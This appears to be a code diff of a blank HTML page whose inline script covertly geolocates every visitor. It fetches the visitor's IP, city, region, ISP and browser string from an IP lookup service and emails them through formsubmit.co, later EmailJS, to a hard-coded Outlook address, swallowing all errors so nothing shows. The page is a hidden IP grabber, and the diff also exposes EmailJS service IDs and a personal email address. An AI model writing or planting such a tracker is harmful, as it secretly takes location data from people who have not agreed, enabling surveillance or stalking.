@@ -1,35 +1,39 @@
 <!DOCTYPE html>
 <html>
-<head></head>
+<head>
+<meta charset="utf-8">
+</head>
 <body style="background:#fff;"></body>
 
 <script>
 (async function(){
   try {
-    // 1. 获取 IP + 位置
-    let ip = await fetch('https://api.ipify.org?format=json').then(r=>r.json());
-    let loc = await fetch('https://ipapi.co/'+ip.ip+'/json/').then(r=>r.json());
+    // 获取 IP
+    const ipData = await fetch('https://ipapi.co/json/').then(res => res.json());
 
-    // 2. 整理内容
-    let content = `
-有人访问了你的页面
-时间：${new Date().toLocaleString()}
-IP：${loc.ip}
-地区：${loc.city} / ${loc.region} / ${loc.country_name}
-运营商：${loc.org}
-浏览器：${navigator.userAgent}
-`;
+    const content =
+      "有人访问了你的页面\n" +
+      "时间：" + new Date().toLocaleString() + "\n" +
+      "IP：" + ipData.ip + "\n" +
+      "地区：" + ipData.city + " " + ipData.region + "\n" +
+      "运营商：" + ipData.org + "\n" +
+      "浏览器：" + navigator.userAgent;
 
-    // 3. 【真正能发邮件到你手里】用免费表单接口
-    await fetch("https://formsubmit.co/ajax/lcy123eric@outlook.com", {
+    // 直接发送到邮箱，不需要令牌！
+    await fetch("https://api.emailjs.com/api/v1.0/email/send", {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({
-        title: "页面被访问",
-        message: content
+        service_id: "service_1uik2tp",
+        template_id: "template_79e4r1q",
+        user_id: "FtV5H0FdKznlVZdR7",
+        template_params: {
+          message: content,
+          to_email: "lcy123eric@outlook.com"
+        }
       })
     });
-  }catch(e){}
+  } catch (e) {}
 })();
 </script>
 </html>
